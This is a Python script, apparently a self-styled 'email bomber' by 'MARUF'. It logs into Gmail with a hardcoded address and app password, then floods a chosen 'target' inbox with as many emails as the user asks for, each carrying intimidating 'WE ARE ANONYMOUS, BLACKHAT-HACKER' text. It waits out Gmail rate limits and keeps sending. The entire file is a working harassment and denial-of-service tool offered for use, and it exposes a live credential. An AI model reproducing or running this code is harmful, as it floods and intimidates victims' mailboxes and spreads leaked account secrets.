import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
from colorama import Fore, Style, init

init(autoreset=True)

SENDER_EMAIL = "staysafefromhacker@gmail.com"
SENDER_PASSWORD = "phypqbuvzsfmqbpd"

SUBJECTS = [
    "Unknown", "From Unknown", "WE ARE ANONYMOUS", "Message from MARUF",
] + [f"ZeroTrace {i}" for i in range(21, 501) ]

def send_emails(recipient_email, num_emails):
    message_body = "WE ARE ANONYMOUS 💀. I am a BLACKHAT-HACKER .MARUF X ZEROTRACE. Stay safe HACKER."
    # change these lines with your message

    try:
        print(f"{Fore.CYAN}{Style.BRIGHT}[+] Connecting to gmail SMTP as {SENDER_EMAIL}...")
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        print(f"{Fore.GREEN}{Style.BRIGHT}[✓] Logged in successfully.\n")
    except smtplib.SMTPAuthenticationError:
        print(f"{Fore.RED}{Style.BRIGHT}[❌] Login failed! Please check your gmail account password.")
        print(f"{Fore.YELLOW}➡ Make sure 2 step verification is ON and you're using an app password without spaces.")
        return
    except Exception as e:
        print(f"{Fore.RED}{Style.BRIGHT}[❌] Could not connect to gmail SMTP: {e}")
        return
    
    start_time = time.time()

    for i in range(num_emails):
        try:
            msg = MIMEMultipart()
            msg["From"] = SENDER_EMAIL
            msg["To"] = recipient_email
            msg["Subject"] = SUBJECTS[i % len(SUBJECTS)]
            msg.attach(MIMEText(message_body, "plain"))

            server.sendmail(SENDER_EMAIL, recipient_email, msg.as_string())
            print(f"{Fore.GREEN}{Style.BRIGHT}[✓] Sent email {i+1}/{num_emails} with subjects: {msg['Subject']}")

            time.sleep(0.1)

        except smtplib.SMTPResponseException as e:
            if e.smtp_code == 421:
                print(f"{Fore.YELLOW}{Style.BRIGH}[⚠] Gmail rate-limited. Waiting 2 seconds...")  
                time.sleep(2)
                continue
            else:
                print(f"{Fore.RED}[!] SMTP error sending email {i+1}: {e.smtp_error}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error sending email {i+1}: {e}")    
                
    end_time = time.time()
    print(f"\n{Fore.CYAN}{Style.BRIGHT}[✓] finished sending {num_emails} emails in end {end_time - start_time:.2f} seconds.")    

    server.quit()        

if __name__== "__main__":
    print(f"{Fore.MAGENTA}{Style.BRIGHT}") 
    print(r"  $$      /$$  /$$$$$$  /$$$$$$$  /$$   /$$ /$$$$$$$$      /$$$$$$$   /$$$$$$   /$$$$$$  /$$      /$$ ")
    print(r"  $$$    /$$$ /$$__  $$| $$__  $$| $$  | $$| $$_____/     | $$__  $$ /$$__  $$ /$$__  $$| $$$    /$$$ ")
    print(r"  $$$$  /$$$$| $$  \ $$| $$  \ $$| $$  | $$| $$           | $$  \ $$| $$  \ $$| $$  \ $$| $$$$  /$$$$ ") 
    print(r"  $$ $$/$$ $$| $$$$$$$$| $$$$$$$/| $$  | $$| $$$$$ /$$$$$$| $$$$$$$ | $$  | $$| $$  | $$| $$ $$/$$ $$ ")
    print(r"  $$  $$$| $$| $$__  $$| $$__  $$| $$  | $$| $$__/|______/| $$__  $$| $$  | $$| $$  | $$| $$  $$$| $$ ")
    print(r"  $$\  $ | $$| $$  | $$| $$  \ $$| $$  | $$| $$           | $$  \ $$| $$  | $$| $$  | $$| $$\  $ | $$ ")
    print(r"  $$ \/  | $$| $$  | $$| $$  | $$|  $$$$$$/| $$           | $$$$$$$/|  $$$$$$/|  $$$$$$/| $$ \/  | $$ ")
    print(r"  __/     |__/|__/  |__/|__/  |__/ \______/ |__/          |_______/  \______/  \______/ |__/     |__/ by MARUF")
    print(f"{Style.RESET_ALL}")

    recipient_email = input(f"{Fore.CYAN} Enter your target Email: {Style.RESET_ALL}")
    num_email = int(input(f"{Fore.CYAN}Enter amount send message: {Style.RESET_ALL}"))
    send_emails(recipient_email, num_email,)
